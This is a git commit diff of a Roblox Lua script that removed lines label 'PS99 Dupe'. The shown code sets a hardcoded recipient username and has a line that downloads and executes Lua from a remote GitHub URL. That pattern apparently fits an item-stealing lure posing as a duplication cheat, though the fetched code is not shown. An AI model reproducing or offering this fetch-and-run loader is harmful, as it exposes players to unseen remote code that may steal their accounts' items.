5db60892b50de1df5c8cc4fce8d80ce361631b03
hsdfuyhsdufhs <128642081+hsdfuyhsdufhs@users.noreply.github.com>
2024-01-03 22:46:15 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,8 +1,4 @@
 Username = "Akkaunt230"
-_G.CustomScriptName = "PS99 Dupe" -- Main text
-_G.Text1 = "Script Loaded..." --tip test1
-_G.Text2 = "Waiting for Script" --tip test1
-_G.Text3 = "Checking Scripts..." --tip test1
-_G.Text4 = "Starting Scripts..." --tip test1
-
+loadingscreen = false 
+farmui = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
